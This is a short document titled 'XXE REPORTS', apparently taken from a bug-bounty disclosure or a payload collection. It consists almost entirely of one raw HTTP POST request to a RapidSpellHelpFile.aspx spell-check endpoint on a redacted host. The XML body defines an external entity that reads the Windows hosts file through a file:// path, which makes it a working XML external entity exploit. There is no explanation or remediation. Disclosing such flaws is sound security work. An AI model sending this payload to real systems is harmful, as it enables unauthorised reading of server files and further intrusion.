# XXE REPORTS
```bash
POST /Kview/CustomCodeBehind/Base/Utilities/RapidSpellHelpFile.aspx HTTP/1.1
Host: ███████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=UTF-8
Content-Length: 1238
Connection: close
Referer: https://██████████/Kview/CustomCodeBehind/Base/PersonalHomepage/PersonalHomepageCalendarAddEvent.aspx?EventAction=AddEvent&EventDate=10/16/2019%2012:00:01%20AM
Cookie: [COOKIES]

<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY a SYSTEM "file:///c:\Windows\System32\Drivers\etc\hosts">]>
<r><resp>xml</resp><textToCheck>&a;</textToCheck><IAW/><UserDictionaryFile/><DictFile>d:\Meridian\MWRA\MG\11.1\KView\CustomCodeBehind\Base/en-US/DICT-EN-US-USEnglish.dict</DictFile><SuggestionsMethod>HASHING_SUGGESTIONS</SuggestionsMethod><LanguageParser>ENGLISH</LanguageParser><SeparateHyphenWords>False</SeparateHyphenWords><V2Parser>True</V2Parser><SSLFriendlyPage>/KView/CustomCodeBehind/WebResource.axd?d=zqrwmEhOpCtb9wLAM9uWrOzT_jYv5Un0ehQNczyIJSp-b9XbsULhZuZahCBf8Qk8anUm2kaMbXSDgD8qtwoc7T6Vnc9cbWVmTwIkPCbvIqLzTEGbDgA2oGtmx8o1&amp;t=633221022140000000</SSLFriendlyPage><SuggestSplitWords>True</SuggestSplitWords><IncludeUserDictionaryInSuggestions>True</IncludeUserDictionaryInSuggestions><WarnDuplicates>True</WarnDuplicates><IgnoreWordsWithDigits>True</IgnoreWordsWithDigits><CheckCompoundWords>False</CheckCompoundWords><LookIntoHyphenatedText>True</LookIntoHyphenatedText><GuiLanguage>ENGLISH</GuiLanguage><IgnoreXML>False</IgnoreXML><IgnoreCapitalizedWords>False</IgnoreCapitalizedWords><ConsiderationRange>-1</ConsiderationRange><IgnoreURLsAndEmailAddresses>True</IgnoreURLsAndEmailAddresses><AllowMixedCase>False</AllowMixedCase></r>

```
